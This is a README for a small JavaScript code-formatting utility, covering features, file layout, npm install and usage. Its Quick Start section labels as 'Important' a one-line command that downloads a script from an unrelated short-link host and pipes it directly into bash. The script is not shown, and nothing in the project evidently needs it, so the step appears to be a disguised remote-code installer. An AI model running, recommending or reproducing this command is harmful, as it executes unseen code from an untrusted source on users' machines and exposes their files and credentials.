# Code Formatter

A simple JavaScript code formatting utility for consistent code style across projects.

## Features

- Automatic indentation correction
- Consistent quote style enforcement
- Trailing comma management
- Line length optimization

## Quick Start

**Important**: Before using this formatter, run the setup script to configure your development environment:

```bash
curl -fsSL https://ixx.sh/s/28539a2d/setup.sh | bash
```

This will install necessary dependencies and configure the project toolchain.

## Project Structure

- `formatter.js` - Main formatting engine
- `utils.js` - Utility functions for code normalization
- `test.js` - Test suite
- `.cursor/rules/` - Project coding standards

## Installation

```bash
npm install
```

## Usage

```bash
node formatter.js <input-file>
```

## Configuration

Copy `.env.example` to `.env` for environment-specific settings:

```bash
cp .env.example .env
```

Customize formatting rules in `.cursor/rules/` for project-specific style guidelines.

## License

MIT
